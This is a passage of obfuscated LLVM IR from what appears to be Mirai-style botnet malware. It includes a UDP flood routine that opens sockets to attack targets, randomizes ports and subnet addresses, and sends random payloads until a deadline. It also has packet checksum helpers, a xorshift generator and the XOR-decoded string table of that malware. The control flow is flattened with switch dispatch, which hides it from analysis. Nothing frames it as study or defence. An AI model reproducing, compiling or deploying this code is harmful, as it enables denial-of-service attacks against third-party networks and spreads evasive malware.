  %50 = bitcast %struct.sockaddr_in* %18 to i8*
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 16, i32 4, i1 false)
  %51 = call i64 @time(i64* null) #6
  %52 = load i32, i32* %6, align 4
  %53 = sext i32 %52 to i64
  %54 = add nsw i64 %51, %53
  %55 = trunc i64 %54 to i32
  store i32 %55, i32* %19, align 4
  %56 = load i16, i16* %15, align 2
  %57 = zext i16 %56 to i32
  store i32 %57, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -844450890, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -844450890, label %first
    i32 -1013123776, label %60
    i32 1567141258, label %63
    i32 -398196517, label %66
    i32 2127631623, label %67
    i32 578104825, label %73
    i32 -322287756, label %83
    i32 220913406, label %92
    i32 1823028992, label %101
    i32 1779918404, label %109
    i32 1575633550, label %110
    i32 1340472677, label %128
    i32 2137090007, label %129
    i32 -1020197570, label %139
    i32 -634731307, label %165
    i32 -1650349054, label %183
    i32 769797865, label %184
    i32 -919408901, label %185
    i32 -320615494, label %188
    i32 -781756580, label %189
    i32 2097704649, label %190
    i32 1146630996, label %196
    i32 1560784677, label %205
    i32 1773646152, label %213
    i32 -1706440444, label %223
    i32 2014256296, label %226
    i32 -286496256, label %232
    i32 1026414882, label %233
    i32 2103825422, label %234
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %58 = icmp eq i32 %.reload, 65535
  %59 = select i1 %58, i32 -1013123776, i32 1567141258
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = call i32 @rand_next()
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %15, align 2
  store i32 -398196517, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i16, i16* %15, align 2
  %65 = call zeroext i16 @htons(i16 zeroext %64) #7
  store i16 %65, i16* %15, align 2
  store i32 -398196517, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 2127631623, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* %11, align 4
  %69 = load i8, i8* %7, align 1
  %70 = zext i8 %69 to i32
  %71 = icmp slt i32 %68, %70
  %72 = select i1 %71, i32 578104825, i32 -320615494
  store i32 %72, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %75 = load i8**, i8*** %12, align 8
  %76 = load i32, i32* %11, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8*, i8** %75, i64 %77
  store i8* %74, i8** %78, align 8
  %79 = load i16, i16* %14, align 2
  %80 = zext i16 %79 to i32
  %81 = icmp eq i32 %80, 65535
  %82 = select i1 %81, i32 -322287756, i32 220913406
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  %84 = call i32 @rand_next()
  %85 = trunc i32 %84 to i16
  %86 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %87 = load i32, i32* %11, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %86, i64 %88
  %90 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %89, i32 0, i32 0
  %91 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %90, i32 0, i32 1
  store i16 %85, i16* %91, align 2
  store i32 1823028992, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  %93 = load i16, i16* %14, align 2
  %94 = call zeroext i16 @htons(i16 zeroext %93) #7
  %95 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %96 = load i32, i32* %11, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %95, i64 %97
  %99 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %98, i32 0, i32 0
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %99, i32 0, i32 1
  store i16 %94, i16* %100, align 2
  store i32 1823028992, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %103 = load i32*, i32** %13, align 8
  %104 = load i32, i32* %11, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i32, i32* %103, i64 %105
  store i32 %102, i32* %106, align 4
  %107 = icmp eq i32 %102, -1
  %108 = select i1 %107, i32 1779918404, i32 1575633550
  store i32 %108, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 2103825422, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %111, align 4
  %112 = load i16, i16* %15, align 2
  %113 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %112, i16* %113, align 2
  %114 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %115 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %114, i32 0, i32 0
  store i32 0, i32* %115, align 4
  %116 = load i32*, i32** %13, align 8
  %117 = load i32, i32* %11, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds i32, i32* %116, i64 %118
  %120 = load i32, i32* %119, align 4
  %121 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  %122 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  store %struct.sockaddr* %122, %struct.sockaddr** %121, align 8
  %123 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %124 = load %struct.sockaddr*, %struct.sockaddr** %123, align 8
  %125 = call i32 @bind(i32 %120, %struct.sockaddr* %124, i32 16) #6
  %126 = icmp eq i32 %125, -1
  %127 = select i1 %126, i32 1340472677, i32 2137090007
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 2137090007, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %131 = load i32, i32* %11, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %130, i64 %132
  %134 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %133, i32 0, i32 2
  %135 = load i8, i8* %134, align 4
  %136 = zext i8 %135 to i32
  %137 = icmp slt i32 %136, 32
  %138 = select i1 %137, i32 -1020197570, i32 -634731307
  store i32 %138, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %141 = load i32, i32* %11, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %140, i64 %142
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %143, i32 0, i32 1
  %145 = load i32, i32* %144, align 4
  %146 = call i32 @ntohl(i32 %145) #7
  %147 = call i32 @rand_next()
  %148 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %149 = load i32, i32* %11, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %148, i64 %150
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %151, i32 0, i32 2
  %153 = load i8, i8* %152, align 4
  %154 = zext i8 %153 to i32
  %155 = lshr i32 %147, %154
  %156 = add i32 %146, %155
  %157 = call i32 @htonl(i32 %156) #7
  %158 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %159 = load i32, i32* %11, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %158, i64 %160
  %162 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i32 0, i32 0
  %163 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %162, i32 0, i32 2
  %164 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %163, i32 0, i32 0
  store i32 %157, i32* %164, align 4
  store i32 -634731307, i32* %switchVar
  br label %loopEnd

; <label>:165:                                    ; preds = %loopEntry
  %166 = load i32*, i32** %13, align 8
  %167 = load i32, i32* %11, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds i32, i32* %166, i64 %168
  %170 = load i32, i32* %169, align 4
  %171 = bitcast %union.__CONST_SOCKADDR_ARG* %24 to %struct.sockaddr**
  %172 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %173 = load i32, i32* %11, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %172, i64 %174
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %175, i32 0, i32 0
  %177 = bitcast %struct.sockaddr_in* %176 to %struct.sockaddr*
  store %struct.sockaddr* %177, %struct.sockaddr** %171, align 8
  %178 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %24, i32 0, i32 0
  %179 = load %struct.sockaddr*, %struct.sockaddr** %178, align 8
  %180 = call i32 @connect(i32 %170, %struct.sockaddr* %179, i32 16)
  %181 = icmp eq i32 %180, -1
  %182 = select i1 %181, i32 -1650349054, i32 769797865
  store i32 %182, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  store i32 769797865, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  store i32 -919408901, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  %186 = load i32, i32* %11, align 4
  %187 = add nsw i32 %186, 1
  store i32 %187, i32* %11, align 4
  store i32 2127631623, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  store i32 -781756580, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 2097704649, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = load i32, i32* %11, align 4
  %192 = load i8, i8* %7, align 1
  %193 = zext i8 %192 to i32
  %194 = icmp slt i32 %191, %193
  %195 = select i1 %194, i32 1146630996, i32 2014256296
  store i32 %195, i32* %switchVar
  br label %loopEnd

; <label>:196:                                    ; preds = %loopEntry
  %197 = load i8**, i8*** %12, align 8
  %198 = load i32, i32* %11, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds i8*, i8** %197, i64 %199
  %201 = load i8*, i8** %200, align 8
  store i8* %201, i8** %25, align 8
  %202 = load i8, i8* %17, align 1
  %203 = icmp ne i8 %202, 0
  %204 = select i1 %203, i32 1560784677, i32 1773646152
  store i32 %204, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  %206 = load i8*, i8** %25, align 8
  %207 = load i16, i16* %16, align 2
  %208 = zext i16 %207 to i32
  call void @rand_alpha_str(i8* %206, i32 %208)
  %209 = load i8*, i8** %25, align 8
  %210 = load i16, i16* %16, align 2
  %211 = zext i16 %210 to i64
  %212 = getelementptr inbounds i8, i8* %209, i64 %211
  store i8 0, i8* %212, align 1
  store i32 1773646152, i32* %switchVar
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %214 = load i32*, i32** %13, align 8
  %215 = load i32, i32* %11, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds i32, i32* %214, i64 %216
  %218 = load i32, i32* %217, align 4
  %219 = load i8*, i8** %25, align 8
  %220 = load i16, i16* %16, align 2
  %221 = zext i16 %220 to i64
  %222 = call i64 @send(i32 %218, i8* %219, i64 %221, i32 16384)
  store i32 -1706440444, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = load i32, i32* %11, align 4
  %225 = add nsw i32 %224, 1
  store i32 %225, i32* %11, align 4
  store i32 2097704649, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = call i64 @time(i64* null) #6
  %228 = load i32, i32* %19, align 4
  %229 = sext i32 %228 to i64
  %230 = icmp sgt i64 %227, %229
  %231 = select i1 %230, i32 -286496256, i32 1026414882
  store i32 %231, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  store i32 2103825422, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  store i32 -781756580, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %233, %232, %226, %223, %213, %205, %196, %190, %189, %188, %185, %184, %183, %165, %139, %129, %128, %110, %109, %101, %92, %83, %73, %67, %66, %63, %60, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  %switchVar = alloca i32
  store i32 -933398142, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -933398142, label %6
    i32 -1214767470, label %10
    i32 485101930, label %17
    i32 -1107382250, label %20
    i32 928374492, label %24
    i32 -1481229627, label %31
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  %9 = select i1 %8, i32 -1214767470, i32 -1107382250
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i16*, i16** %3, align 8
  %12 = getelementptr inbounds i16, i16* %11, i32 1
  store i16* %12, i16** %3, align 8
  %13 = load i16, i16* %11, align 2
  %14 = zext i16 %13 to i64
  %15 = load i64, i64* %5, align 8
  %16 = add i64 %15, %14
  store i64 %16, i64* %5, align 8
  store i32 485101930, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load i32, i32* %4, align 4
  %19 = sub i32 %18, 2
  store i32 %19, i32* %4, align 4
  store i32 -933398142, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %4, align 4
  %22 = icmp eq i32 %21, 1
  %23 = select i1 %22, i32 928374492, i32 -1481229627
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i16*, i16** %3, align 8
  %26 = load i16, i16* %25, align 2
  %27 = trunc i16 %26 to i8
  %28 = sext i8 %27 to i64
  %29 = load i64, i64* %5, align 8
  %30 = add i64 %29, %28
  store i64 %30, i64* %5, align 8
  store i32 -1481229627, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i64, i64* %5, align 8
  %33 = lshr i64 %32, 16
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = add i64 %33, %35
  store i64 %36, i64* %5, align 8
  %37 = load i64, i64* %5, align 8
  %38 = lshr i64 %37, 16
  %39 = load i64, i64* %5, align 8
  %40 = add i64 %39, %38
  store i64 %40, i64* %5, align 8
  %41 = load i64, i64* %5, align 8
  %42 = xor i64 %41, -1
  %43 = trunc i64 %42 to i16
  ret i16 %43

loopEnd:                                          ; preds = %24, %20, %17, %10, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  %switchVar = alloca i32
  store i32 -1341182876, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1341182876, label %23
    i32 1170949385, label %27
    i32 1265375171, label %37
    i32 -1690861880, label %41
    i32 -529748270, label %48
    i32 941065076, label %79
    i32 1960385992, label %84
    i32 243109180, label %90
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  %26 = select i1 %25, i32 1170949385, i32 1265375171
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i16*, i16** %9, align 8
  %29 = load i16, i16* %28, align 2
  %30 = zext i16 %29 to i32
  %31 = load i32, i32* %12, align 4
  %32 = add i32 %31, %30
  store i32 %32, i32* %12, align 4
  %33 = load i16*, i16** %9, align 8
  %34 = getelementptr inbounds i16, i16* %33, i32 1
  store i16* %34, i16** %9, align 8
  %35 = load i32, i32* %8, align 4
  %36 = sub nsw i32 %35, 2
  store i32 %36, i32* %8, align 4
  store i32 -1341182876, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %8, align 4
  %39 = icmp eq i32 %38, 1
  %40 = select i1 %39, i32 -1690861880, i32 -529748270
  store i32 %40, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i16*, i16** %9, align 8
  %43 = bitcast i16* %42 to i8*
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = load i32, i32* %12, align 4
  %47 = add i32 %46, %45
  store i32 %47, i32* %12, align 4
  store i32 -529748270, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %10, align 4
  %50 = lshr i32 %49, 16
  %51 = and i32 %50, 65535
  %52 = load i32, i32* %12, align 4
  %53 = add i32 %52, %51
  store i32 %53, i32* %12, align 4
  %54 = load i32, i32* %10, align 4
  %55 = and i32 %54, 65535
  %56 = load i32, i32* %12, align 4
  %57 = add i32 %56, %55
  store i32 %57, i32* %12, align 4
  %58 = load i32, i32* %11, align 4
  %59 = lshr i32 %58, 16
  %60 = and i32 %59, 65535
  %61 = load i32, i32* %12, align 4
  %62 = add i32 %61, %60
  store i32 %62, i32* %12, align 4
  %63 = load i32, i32* %11, align 4
  %64 = and i32 %63, 65535
  %65 = load i32, i32* %12, align 4
  %66 = add i32 %65, %64
  store i32 %66, i32* %12, align 4
  %67 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %68 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %67, i32 0, i32 6
  %69 = load i8, i8* %68, align 1
  %70 = zext i8 %69 to i16
  %71 = call zeroext i16 @htons(i16 zeroext %70) #7
  %72 = zext i16 %71 to i32
  %73 = load i32, i32* %12, align 4
  %74 = add i32 %73, %72
  store i32 %74, i32* %12, align 4
  %75 = load i16, i16* %7, align 2
  %76 = zext i16 %75 to i32
  %77 = load i32, i32* %12, align 4
  %78 = add i32 %77, %76
  store i32 %78, i32* %12, align 4
  store i32 941065076, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i32, i32* %12, align 4
  %81 = lshr i32 %80, 16
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 1960385992, i32 243109180
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %12, align 4
  %86 = and i32 %85, 65535
  %87 = load i32, i32* %12, align 4
  %88 = lshr i32 %87, 16
  %89 = add i32 %86, %88
  store i32 %89, i32* %12, align 4
  store i32 941065076, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i32, i32* %12, align 4
  %92 = xor i32 %91, -1
  %93 = trunc i32 %92 to i16
  ret i16 %93

loopEnd:                                          ; preds = %84, %79, %48, %41, %37, %27, %23, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alpha_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [23 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  call void @table_unlock_val(i8 zeroext 41)
  %6 = getelementptr inbounds [23 x i8], [23 x i8]* %5, i32 0, i32 0
  %7 = call i8* @table_retrieve_val(i32 41, i32* null)
  %8 = call i8* @strcpy(i8* %6, i8* %7) #6
  %switchVar = alloca i32
  store i32 -1100593881, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1100593881, label %9
    i32 -917722976, label %14
    i32 669201329, label %24
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %4, align 4
  %11 = add nsw i32 %10, -1
  store i32 %11, i32* %4, align 4
  %12 = icmp ne i32 %10, 0
  %13 = select i1 %12, i32 -917722976, i32 669201329
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = call i32 @rand_next()
  %16 = getelementptr inbounds [23 x i8], [23 x i8]* %5, i32 0, i32 0
  %17 = call i32 @util_strlen(i8* %16)
  %18 = urem i32 %15, %17
  %19 = zext i32 %18 to i64
  %20 = getelementptr inbounds [23 x i8], [23 x i8]* %5, i64 0, i64 %19
  %21 = load i8, i8* %20, align 1
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i32 1
  store i8* %23, i8** %3, align 8
  store i8 %21, i8* %22, align 1
  store i32 -1100593881, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  call void @table_lock_val(i8 zeroext 41)
  ret void

loopEnd:                                          ; preds = %14, %9, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  %switchVar = alloca i32
  store i32 230277075, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 230277075, label %27
    i32 -1985395613, label %35
    i32 -571583338, label %84
    i32 -152192682, label %87
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 1
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = icmp slt i32 %28, %32
  %34 = select i1 %33, i32 -1985395613, i32 -152192682
  store i32 %34, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i8, i8* %5, align 1
  %37 = zext i8 %36 to i32
  %38 = load %struct.table_value*, %struct.table_value** %4, align 8
  %39 = getelementptr inbounds %struct.table_value, %struct.table_value* %38, i32 0, i32 0
  %40 = load i8*, i8** %39, align 8
  %41 = load i32, i32* %3, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i8, i8* %40, i64 %42
  %44 = load i8, i8* %43, align 1
  %45 = sext i8 %44 to i32
  %46 = xor i32 %45, %37
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %43, align 1
  %48 = load i8, i8* %6, align 1
  %49 = zext i8 %48 to i32
  %50 = load %struct.table_value*, %struct.table_value** %4, align 8
  %51 = getelementptr inbounds %struct.table_value, %struct.table_value* %50, i32 0, i32 0
  %52 = load i8*, i8** %51, align 8
  %53 = load i32, i32* %3, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %52, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = sext i8 %56 to i32
  %58 = xor i32 %57, %49
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %55, align 1
  %60 = load i8, i8* %7, align 1
  %61 = zext i8 %60 to i32
  %62 = load %struct.table_value*, %struct.table_value** %4, align 8
  %63 = getelementptr inbounds %struct.table_value, %struct.table_value* %62, i32 0, i32 0
  %64 = load i8*, i8** %63, align 8
  %65 = load i32, i32* %3, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  %68 = load i8, i8* %67, align 1
  %69 = sext i8 %68 to i32
  %70 = xor i32 %69, %61
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %67, align 1
  %72 = load i8, i8* %8, align 1
  %73 = zext i8 %72 to i32
  %74 = load %struct.table_value*, %struct.table_value** %4, align 8
  %75 = getelementptr inbounds %struct.table_value, %struct.table_value* %74, i32 0, i32 0
  %76 = load i8*, i8** %75, align 8
  %77 = load i32, i32* %3, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i8, i8* %76, i64 %78
  %80 = load i8, i8* %79, align 1
  %81 = sext i8 %80 to i32
  %82 = xor i32 %81, %73
  %83 = trunc i32 %82 to i8
